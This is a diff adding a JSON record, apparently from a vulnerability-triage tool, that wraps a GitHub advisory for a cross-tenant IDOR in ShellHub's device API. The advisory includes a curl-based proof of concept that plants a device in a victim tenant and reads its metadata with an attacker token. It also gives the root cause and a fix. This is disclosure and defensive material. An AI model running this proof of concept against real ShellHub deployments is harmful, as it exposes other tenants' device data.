@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/92599201?v=4\", \"events_url\": \"https://api.github.com/users/Edu0x01/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Edu0x01/followers\", \"following_url\": \"https://api.github.com/users/Edu0x01/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Edu0x01/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Edu0x01\", \"id\": 92599201, \"login\": \"Edu0x01\", \"node_id\": \"U_kgDOBYTzoQ\", \"organizations_url\": \"https://api.github.com/users/Edu0x01/orgs\", \"received_events_url\": \"https://api.github.com/users/Edu0x01/received_events\", \"repos_url\": \"https://api.github.com/users/Edu0x01/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Edu0x01/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Edu0x01/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Edu0x01\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-44424\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-639\", \"name\": \"Authorization Bypass Through User-Controlled Key\"}], \"description\": \"## Summary\\n`GET /api/devices/:uid` returns the full device object whenever the caller is authenticated, without verifying that the device belongs to the caller's namespace (tenant). Any authenticated user (JWT or API Key) who knows or can guess a device UID can read device metadata from any other namespace.\\n\\n## Severity\\n**CVSS 3.1: 7.5 (High)** \\nCWE-639 — Authorization Bypass Through User-Controlled Key\\n\\n## Affected versions\\nShellHub Community v0.24.1 (validated). Likely all prior versions that share this handler.\\n\\n## Root cause\\n`api/services/device.go:97-104` — `GetDevice` resolves the device by UID without scoping to the caller's tenant:\\n\\n  ```go\\n  func (s *service) GetDevice(ctx context.Context, uid models.UID) (*models.Device, error) {\\n      device, err := s.store.DeviceResolve(ctx, store.DeviceUIDResolver, string(uid))\\n      // ⚠️ missing: s.store.Options().InNamespace(tenant)\\n      ...\\n  }\\n  ```\\n\\nCompare with `DeleteDevice` in the same file (line 137) which correctly applies `InNamespace(tenant)`.\\n\\nThe `Authorize` middleware (`api/routes/middleware/authorize.go:12-27`) only checks that a tenant is present in the context — not that the resource belongs to that tenant.\\n\\n## Proof of concept (validated live against v0.24.1)\\n\\nPre-requisite: attacker has any valid user account and knows a target `tenant_id` (UUIDs frequently leak via UI URLs, email invites, support channels, or prior namespace membership).\\n\\n  ```bash\\n  ATTACKER_TOKEN=$(curl -s -X POST http://target/api/login \\\\\\n    -H 'Content-Type: application/json' \\\\\\n    -d '{\\\"username\\\":\\\"attacker\\\",\\\"password\\\":\\\"...\\\"}' | jq -r .token)\\n\\n  TARGET_TENANT=\\\"<victim-tenant-uuid>\\\"\\n\\n  # Plant a device in the victim tenant via the public device-auth endpoint\\n  # (this also works when the victim already has devices and the attacker\\n  # merely guessed/obtained a real UID via another vector)\\n  VICTIM_UID=$(curl -s -X POST http://target/api/devices/auth \\\\\\n    -H 'Content-Type: application/json' \\\\\\n    -d \\\"{\\n      \\\\\\\"info\\\\\\\":{\\\\\\\"id\\\\\\\":\\\\\\\"x\\\\\\\",\\\\\\\"pretty_name\\\\\\\":\\\\\\\"x\\\\\\\",\\\\\\\"version\\\\\\\":\\\\\\\"v0.24.1\\\\\\\",\\\\\\\"arch\\\\\\\":\\\\\\\"amd64\\\\\\\",\\\\\\\"platform\\\\\\\":\\\\\\\"docker\\\\\\\"},\\n      \\\\\\\"hostname\\\\\\\":\\\\\\\"poc\\\\\\\",\\n      \\\\\\\"identity\\\\\\\":{\\\\\\\"mac\\\\\\\":\\\\\\\"aa:bb:cc:dd:ee:ff\\\\\\\"},\\n      \\\\\\\"public_key\\\\\\\":\\\\\\\"-----BEGIN RSA PUBLIC KEY-----\\\\\\\\nx\\\\\\\\n-----END RSA PUBLIC KEY-----\\\\\\\",\\n      \\\\\\\"tenant_id\\\\\\\":\\\\\\\"$TARGET_TENANT\\\\\\\"\\n    }\\\" | jq -r .uid)\\n\\n  # Read the device from a completely different tenant\\n  curl -i \\\"http://target/api/devices/$VICTIM_UID\\\" \\\\\\n    -H \\\"Authorization: Bearer $ATTACKER_TOKEN\\\"\\n  # Expected (fixed):   HTTP 403/404\\n  # Observed (v0.24.1): HTTP 200 + full device JSON (tenant_id, public_key, MAC,\\n  #                     namespace name, OS info, last_seen, remote_addr, ...)\\n  ```\\n\\n## Impact\\n  - Cross-tenant disclosure of device metadata: hostname, MAC, OS fingerprint, public SSH key, namespace name, last-seen timestamp, remote address.\\n  - Enables namespace enumeration, device inventory reconnaissance of other tenants, and targeted follow-up attacks.\\n\\n## Suggested fix\\nIn `api/services/device.go` `GetDevice`, extract tenant from context and apply `InNamespace`:\\n\\n  ```go\\n  func (s *service) GetDevice(ctx context.Context, uid models.UID) (*models.Device, error) {\\n      tenant := gateway.TenantFromContext(ctx)\\n      opts := []store.QueryOption{}\\n      if tenant != nil {\\n          opts = append(opts, s.store.Options().InNamespace(tenant.ID))\\n      }\\n      device, err := s.store.DeviceResolve(ctx, store.DeviceUIDResolver, string(uid), opts...)\\n      ...\\n  }\\n  ```\", \"epss\": {\"percentage\": 0.00246, \"percentile\": 0.15508}, \"ghsa_id\": \"GHSA-j72x-xfwg-783f\", \"github_reviewed_at\": \"2026-05-06T23:19:46Z\", \"html_url\": \"https://github.com/advisories/GHSA-j72x-xfwg-783f\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-j72x-xfwg-783f\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-44424\"}], \"nvd_published_at\": \"2026-05-13T22:16:44Z\", \"published_at\": \"2026-05-06T23:19:46Z\", \"references\": [\"https://github.com/shellhub-io/shellhub/security/advisories/GHSA-j72x-xfwg-783f\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-44424\", \"https://github.com/advisories/GHSA-j72x-xfwg-783f\"], \"repository_advisory_url\": \"https://api.github.com/repos/shellhub-io/shellhub/security-advisories/GHSA-j72x-xfwg-783f\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/shellhub-io/shellhub\", \"summary\": \"ShellHub has cross-tenant IDOR in `GET /api/devices/:uid` that discloses device data of any namespace\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-14T20:43:15Z\", \"url\": \"https://api.github.com/advisories/GHSA-j72x-xfwg-783f\", \"vulnerabilities\": [{\"first_patched_version\": \"0.24.2\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/shellhub-io/shellhub\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.24.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-j72x-xfwg-783f",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/shellhub-io/shellhub: <= 0.24.1"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-44424"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/shellhub-io/shellhub"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.268018Z",
+  "provenance": {
+    "content_sha256": "42e5fce74fbb28be62a22e8e7b16d65e833b2801cd866c421dd54a82c6cd6d86",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-06T23:19:46Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-j72x-xfwg-783f",
+  "status": "active",
+  "title": "ShellHub has cross-tenant IDOR in `GET /api/devices/:uid` that discloses device data of any namespace",
+  "updated_at": "2026-05-14T20:43:15Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-j72x-xfwg-783f"
+}
